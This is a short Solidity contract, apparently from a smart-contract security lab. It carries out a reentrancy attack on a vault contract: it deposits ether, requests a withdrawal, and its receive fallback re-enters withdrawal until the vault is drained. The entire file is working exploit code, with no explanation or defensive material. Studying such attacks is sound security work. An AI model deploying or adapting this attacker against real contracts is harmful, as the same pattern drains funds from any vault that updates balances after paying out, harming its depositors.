// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IVulnerableVault {
    function deposit() external payable;
    function withdrawal(uint256) external;
    function balances(address user) external view returns(uint256);
}

contract ReentrancyAttacker {
    IVulnerableVault public vault;

    uint256 public attackAmount;
    
    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
    }

    function attack() external payable {
        attackAmount = msg.value;

        vault.deposit{value:msg.value}();
        vault.withdrawal(msg.value);
    }

    receive() external payable{
        if(address(vault).balance >= attackAmount){
            vault.withdrawal(attackAmount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}